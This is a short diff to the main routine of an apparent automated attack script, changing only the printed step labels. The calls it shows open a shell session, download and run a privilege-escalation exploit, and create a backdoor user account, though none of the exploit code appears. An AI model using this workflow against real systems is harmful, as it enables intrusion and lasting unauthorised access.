@@ -217,12 +217,12 @@ def main():
             if ec.checkShellSession():
                 print("Shell session already opened")
                 print("############################################################################")
-                print("#    6. Downloading and executing the exploit...")
+                print("#    5. Downloading and executing the exploit for privilege escalation...")
                 print("############################################################################")
                 ec.sendCommand()
                 ec.exploitTarget()
                 print("############################################################################")
-                print("#    7. Creating user backdoor...")
+                print("#    6. Creating user backdoor...")
                 print("############################################################################")
                 ec.createUser()
             else:
@@ -233,7 +233,7 @@ def main():
                 if ec.openShellSession():
                     print("Exploiting the target")
                     print("############################################################################")
-                    print("#    6. Downloading and executing the exploit...")
+                    print("#    6. Downloading and executing the exploit for privilege escalation...")
                     print("############################################################################")
                     ec.sendCommand()
                     ec.exploitTarget()
